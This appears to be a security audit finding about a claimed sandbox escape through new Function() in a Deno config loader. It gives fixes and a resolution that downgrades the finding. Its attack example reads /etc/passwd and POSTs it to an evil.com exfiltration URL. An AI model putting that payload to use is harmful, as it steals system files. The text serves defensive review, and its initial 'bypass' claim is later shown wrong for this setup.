# 016.3: Sandbox Escape via Function()

## Severity: HIGH

## Location

**File:** `src/security/sandbox/deno-sandbox.ts`
**Lines:** 46-56

```typescript
// VULNERABLE - new Function() escapes Deno sandbox
const userFunction = new Function('config', userCode);
const result = userFunction(configObject);
```

## The Problem

`new Function(code)` creates a function in the global scope, bypassing Deno's permission system. Malicious config code can access filesystem, network, and environment.

### Why This Bypasses Deno Sandbox

```
Deno.run() → Permission check → Denied (if no --allow-run)
new Function('Deno.run(...)') → No permission check → Executes!
```

### Attack Vector

```typescript
// Malicious veryfront.config.ts
export default {
  plugins: [
    {
      setup: () => {
        // This executes with full privileges
        const proc = Deno.run({ cmd: ["cat", "/etc/passwd"] });
        fetch("https://evil.com/exfil", {
          method: "POST",
          body: await proc.output()
        });
      }
    }
  ]
}
```

## Proposed Fix

### Option A: Deno.eval with Permissions (Recommended)

```typescript
// Run in subprocess with restricted permissions
const result = await Deno.run({
  cmd: ["deno", "eval", "--no-prompt", "--allow-read=./config", code],
  stdout: "piped",
});
```

### Option B: Web Worker Sandbox

```typescript
const worker = new Worker(new URL("./sandbox-worker.ts", import.meta.url), {
  type: "module",
  deno: {
    permissions: {
      read: false,
      write: false,
      net: false,
      env: false,
      run: false,
    },
  },
});
worker.postMessage({ code: userCode });
```

### Option C: Remove Dynamic Execution (Task 001)

Move to JSON config format as proposed in Task 001 - no code execution needed.

## Status: ⚠️ DOWNGRADED to LOW

### Resolution

Investigation found the audit's analysis is incorrect for this specific usage. The `new Function(code)` on line 50 runs **inside** a Worker with `deno: { permissions: "none" }` (line 28). Deno's Worker permission restrictions apply to all code running within the worker, including functions created via `new Function()`. The code cannot access filesystem, network, or environment variables because the worker itself is sandboxed.

**Why the audit claim is wrong:**
- The audit states "`new Function()` bypasses Deno's permission system" — this is true for the main process, but NOT for a worker with `permissions: "none"`
- Worker permissions are enforced at the runtime level, not the code-generation level
- Any `Deno.run()`, `Deno.readFile()`, `fetch()`, or `Deno.env.get()` inside the worker throws a `PermissionDenied` error

**Remaining limitation:**
- On non-Deno runtimes (Node.js), the worker lacks equivalent permission restrictions. However, Node.js is not a supported production runtime for the renderer.
